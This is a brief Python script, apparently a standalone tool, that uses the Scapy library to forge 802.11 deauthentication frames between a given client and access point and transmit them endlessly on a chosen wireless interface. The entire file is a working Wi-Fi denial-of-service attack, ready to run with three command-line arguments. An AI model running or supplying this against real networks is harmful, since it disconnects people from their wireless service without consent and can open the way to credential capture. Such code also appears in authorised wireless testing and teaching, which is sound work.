from scapy.all import *
import os
import sys


### Client MAC address
client = sys.argv[1]
### AP MAC address
ap = sys.argv[2]
### Interafce name 
interface = sys.argv[3]

### Deauthentication packet from AP to client.
pkt_to_c = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth() 

### Deauthentication packet from client to AP.
pkt_to_ap = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()


while True:
	for i in range(50):
		
		### The sendp() function send packets at layer 2 - Data Link Layer
		# Sending deauthentication packet from AP to client.
		print ("Sending deauthentication packet from AP to client")
		# sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_c, iface=interface)

		# Sending deauthentication packet from client to AP.
		print ("Sending deauthentication packet from client to AP")
		# sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
		sendp(pkt_to_ap, iface=interface)



